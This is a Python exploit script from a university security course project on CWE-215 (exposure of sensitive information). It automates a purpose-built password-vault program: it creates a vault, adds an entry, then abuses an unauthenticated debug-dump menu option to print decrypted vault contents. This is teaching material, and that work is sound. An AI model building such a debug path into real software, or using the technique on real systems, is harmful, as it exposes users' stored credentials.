"""
CPSC 525 F25 Group Project
CWE-215: Insecure Exposure of Sensitive Information to an Unauthorized Actor

Jahnissi Nwakanma - 30174827
Khadeeja Abbas - 30180776
Shanza Raza - 30192765
Zainab Bari - 30154224


entries.py
Manages adding, deleting, listing, and getting vault entries.
"""

import os
import sys
import pexpect


def main(execname):

    process = pexpect.spawn(execname, [], timeout=5, echo=False)

    process.expect_exact("Choice:")
    # create a new vault
    process.sendline("2")

    process.expect_exact("Enter name for new vault file: ")
    process.sendline("new")

    process.expect_exact("Enter master password for new vault: ")
    process.sendline("strongMasterPassword")

    # add some entries to this vault
    process.expect_exact("Command: ")
    process.sendline("2")

    process.expect_exact("Entry name: ")
    process.sendline("entry1")

    process.expect_exact("Username: ")
    process.sendline("username1")

    # generate a random strong password
    process.expect_exact("Secret: (press Enter to generate strong password) ")
    process.send("\n")

    process.expect_exact("How many characters long? (default 20, min 12, max 128): ")
    process.sendline("20")

    process.expect_exact("  Uppercase letters (A-Z)? (y/n): ")
    process.sendline("y")

    process.expect_exact("  Lowercase letters (a-z)? (y/n): ")
    process.sendline("y")

    process.expect_exact("  Digits (0-9)? (y/n): ")
    process.sendline("y")

    process.expect_exact("  Symbols (!@#$%^&* etc.)? (y/n): ")
    process.sendline("y")

    process.expect_exact(
        "Use this password? (y = yes, n = no, r = regenerate new one): "
    )
    process.sendline("y")

    # adding notes, scribble scribble scribble
    process.expect_exact("Notes (optional): ")
    process.sendline("useful notes scribble scribble scribble")

    # exiting
    process.expect_exact("Command: ")
    process.sendline("10")

    # start exploit now
    process = pexpect.spawn(execname, [], timeout=5, echo=False)

    process.expect_exact("Choice:")
    process.sendline("3")
    process.expect("No vault loaded. Enter vault filename to debug-dump:")
    process.sendline("new")

    process.expect_exact("Are you sure you want to continue? (y/n):")
    process.sendline("y")
    process.expect_exact("=== DEBUG DUMP (Decrypted Vault Contents) ===")
    process.expect_exact("=== END OF DUMP ===")
    contents = process.before.decode("ascii").strip()
    print(contents)


if __name__ == "__main__":
    try:
        main("python3 main.py")
    except Exception as e:  # pylint: disable=broad-except
        print("Exploit failed.")
        raise
